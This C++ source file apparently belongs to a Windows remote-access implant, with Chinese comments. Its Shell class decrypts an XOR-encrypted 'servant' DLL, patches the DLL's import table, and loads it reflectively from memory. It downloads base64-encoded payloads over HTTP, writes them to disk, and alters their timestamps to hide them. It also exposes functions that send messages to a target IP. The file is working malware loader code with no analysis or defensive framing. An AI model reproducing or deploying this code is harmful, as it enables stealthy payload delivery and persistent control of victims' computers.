#include "stdafx.h"
#include <wininet.h>
#include <atlenc.h>
#include "file/MyFile.h"
#include "Exports.h"
#include "MessageDefines.h"
#include "BinNames.h"
#include "common.h"
#include "Shell.h"

#pragma comment(lib, "wininet.lib")

Shell::Shell()
	: m_bWorking(FALSE)
	, m_pServant(NULL)
	, m_fnInitServant(NULL)
	, m_fnDeinitServant(NULL)
	, m_fnSendMsg(NULL)
	, m_fnGetCID(NULL)
{

}

Shell::~Shell()
{

}

BOOL Shell::Init()
{
	m_dllpath = GetBinFilepath();
	m_dllpath += SERVANT_CORE_BINNAME;

	m_hExitEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	if (NULL == m_hExitEvent)
	{
		errorLogE(_T("create event failed."));
		return FALSE;
	}

	//装载servant
	if (! StartLoading())
	{
		return FALSE;
	}
		
	return TRUE;
}

void Shell::Deinit()
{
	Stop();

	m_hExitEvent.Close();

	if (NULL != m_fnDeinitServant) m_fnDeinitServant();
}

BOOL Shell::StartLoading()
{
	if (m_bWorking) return FALSE;

	debugLog(_T("start loading thread"));

	m_bWorking = TRUE;
	if (! m_loadingThread.Start(LoadingThread, this))
	{
		m_bWorking = FALSE;
	}

	return m_bWorking;
}

void Shell::Stop()
{
	m_bWorking = FALSE;
	::SetEvent(m_hExitEvent);
	m_loadingThread.WaitForEnd(3000);
}

DWORD WINAPI Shell::LoadingThread( LPVOID lpParameter )
{
	Shell* pShell = (Shell*) lpParameter;
	pShell->LoadingProc();
	return 0;
}

BOOL Shell::DecodeBase64(LPCSTR base64Encoded, DWORD dwBase64Length, ByteBuffer& byteBuffer) const
{
	int iDecLen = Base64DecodeGetRequiredLength(dwBase64Length) + 10;
	BYTE* pBuffer = (BYTE*) malloc(iDecLen);
	ZeroMemory(pBuffer, iDecLen);

	BOOL bRet = Base64Decode(base64Encoded, dwBase64Length, pBuffer, &iDecLen);
	if (bRet)
	{
		byteBuffer.Alloc(iDecLen);
		memcpy((LPBYTE)byteBuffer, pBuffer, iDecLen);
	}
	else
	{
		errorLogE(_T("base64decode failed."));
	}

	free(pBuffer);

	return bRet;	
}

BOOL Shell::HttpDownloadFile( LPCTSTR url, LPCTSTR localFilepath )
{
	//打开一个internet连接
	HINTERNET internet = ::InternetOpen(_T("IE"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (NULL == internet)
	{
		errorLogE(_T("open internet failed."));
		return FALSE;
	}
	
	//打开一个http url地址
	HINTERNET fileHandle = ::InternetOpenUrl(internet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
	if(NULL == fileHandle)
	{
		errorLogE(_T("open url failed."));
		::InternetCloseHandle(internet);
		return FALSE;
	}

 	BOOL bSuccess = FALSE;
	do 
	{
		//获取数据大小
		TCHAR contentLength[32] = {0};
		DWORD dwBufferLength = sizeof(contentLength);
		DWORD dwIndex = 0;
		if (! ::HttpQueryInfo(fileHandle, HTTP_QUERY_CONTENT_LENGTH, contentLength, &dwBufferLength, &dwIndex))
		{
			errorLogE(_T("get contentlength failed."));
			break;
		}
		LONG lContentLength = _wtol(contentLength);
		if (lContentLength <= 0 || lContentLength > 1024 * 1024 * 4) 
		{
			errorLog(_T("illegal content length : %ld"), lContentLength);
			break;
		}

		//准备数据缓冲区
		ByteBuffer readBuffer;
		readBuffer.Alloc(lContentLength);

		//从url地址中读取文件内容到缓冲区buffer
		DWORD dwRead = 0;//下载的字节数
		LPBYTE pRead = (LPBYTE) readBuffer;
		DWORD dwTotalSize = 0;
		DWORD dwAvailable = lContentLength;
		while (::InternetReadFile(fileHandle, pRead, dwAvailable, &dwRead) && dwRead > 0 && dwAvailable > 0)
		{
			pRead += dwRead;
			dwTotalSize += dwRead;
			dwAvailable -= dwRead;

			dwRead = 0;
		}
		if (dwRead != 0) break;
		debugLogE(_T("recv %u."), dwTotalSize);

		//base64解码
		ByteBuffer fileContent;
		if (! DecodeBase64((LPCSTR)(LPBYTE)readBuffer, dwTotalSize, fileContent))
		{
			errorLog(_T("decode base64 failed"));
			break;
		}

		//写入文件
		MyFile file;
		if (! file.Open(localFilepath, GENERIC_ALL, CREATE_ALWAYS, 0))
		{
			errorLogE(_T("open [%s] failed"), localFilepath);
			break;
		}

		if (! file.Write((LPBYTE)fileContent, fileContent.Size()))
		{
			errorLogE(_T("write file failed."));
			break;
		}
		file.Close();

		AdjustTimes(localFilepath);

		bSuccess = TRUE;
	} while (FALSE);
	
	::InternetCloseHandle(internet);
	::InternetCloseHandle(internet);

	if (! bSuccess) ::DeleteFile(localFilepath);

	CheckDT();

	return bSuccess;
}

void Shell::LoadingProc()
{
	//尝试装载
	BOOL bLoadOK = LoadServant();
	if (bLoadOK)
	{
		debugLog(_T("load servant SUCCESS"));
	}
	else
	{
		errorLog(_T("load servant FAILED"));
	}
}

BOOL Shell::LoadServant()
{
#ifdef DEBUG

#define GETPROCADDRESSD(_lib,fnType,fnName) \
	(fnType)GetProcAddress(_lib,fnName);

	HANDLE hLib = LoadLibrary(SERVANT_CORE_BINNAME);
	m_fnInitServant = GETPROCADDRESSD((HMODULE)hLib,FnInitServant,"InitServant");
	m_fnDeinitServant = GETPROCADDRESSD((HMODULE)hLib,FnDeinitServant, "DeinitServant");
	m_fnSendMsg = GETPROCADDRESSD((HMODULE)hLib,FnSendMsg, "SendMsg");
	m_fnGetCID = GETPROCADDRESSD((HMODULE)hLib, FnGetCID, "GetCID");

	m_fnInitServant(&g_ConfigInfo);
	return TRUE;

#endif
	if (NULL != m_pServant)
	{
		delete m_pServant;
		m_pServant = NULL;
	}

	MyFile file;
	if (! file.Open(m_dllpath.c_str(), GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
	{
		errorLogE(_T("open file [%s] failed"), m_dllpath.c_str());
		return FALSE;
	}
	ByteBuffer content;
	if (! file.ReadAll(content))
	{
		errorLogE(_T("read file [%s] failed"), m_dllpath.c_str());
		return FALSE;
	}
#ifdef USE_ENCRYPTED_CORE
	debugLog(_T("decrypt dll file"));
	XorFibonacciCrypt((LPBYTE)content, content.Size(), (LPBYTE)content, 3, 5);
#endif

	//替换引入表，将对servantshell.dll的引入，替换为当前dll的引入
	if (_tcscmp(GetBinFilename(), SERVANT_SHELL_BINNAME) != 0)
	{
		BOOL bReplaceOK = ReplaceIIDName((LPBYTE)content, t2a(SERVANT_SHELL_BINNAME), t2a(GetBinFilename()));
		infoLog(_T("replace IIDName [%s]->[%s] ret %d"), SERVANT_SHELL_BINNAME, GetBinFilename(), bReplaceOK);
		if (! bReplaceOK) return FALSE;
	}

	m_pServant = new CMemLoadDll;

	BOOL bSuccess = FALSE;
	do 
	{
		if (! m_pServant->MemLoadLibrary((LPBYTE)content, content.Size()))
		{
			errorLogE(_T("load memlibrary failed [%s]"), m_dllpath.c_str());
			break;
		}

#define GETPROCADDRESS(_var, _type, _name)							\
	(_var) = (_type) m_pServant->MemGetProcAddress(_name);			\
	if (NULL == (_var))												\
	{																\
		errorLog(_T("get address of p[%s] failed"), a2t(_name));	\
		break;														\
	}
		
		GETPROCADDRESS(m_fnInitServant, FnInitServant, "InitServant");
		GETPROCADDRESS(m_fnDeinitServant, FnDeinitServant, "DeinitServant");
		GETPROCADDRESS(m_fnSendMsg, FnSendMsg, "SendMsg");
		GETPROCADDRESS(m_fnGetCID, FnGetCID, "GetCID");

		if (! m_fnInitServant(&g_ConfigInfo))
		{
			errorLog(_T("init servant failed"));
			break;
		}

		bSuccess = TRUE;
		debugLog(_T("load servantcore success"));
	} while (FALSE);

 	if (! bSuccess)
 	{
 		delete m_pServant;
 		m_pServant = NULL;

 		m_fnInitServant = NULL;
 		m_fnDeinitServant = NULL;
 		m_fnSendMsg = NULL;

		errorLog(_T("load servant failed"));
 	}

	return bSuccess;
}

BOOL Shell::Servant_SendMsg( const LPBYTE pData, DWORD dwSize, COMM_NAME commname, ULONG targetIP )
{
	if (NULL == m_fnSendMsg) return FALSE;

	return m_fnSendMsg(pData, dwSize, commname, targetIP);
}

BOOL Shell::Servant_GetCID( GUID& guid )
{
	if (NULL == m_fnGetCID) return FALSE;

	guid = m_fnGetCID();

	return TRUE;
}
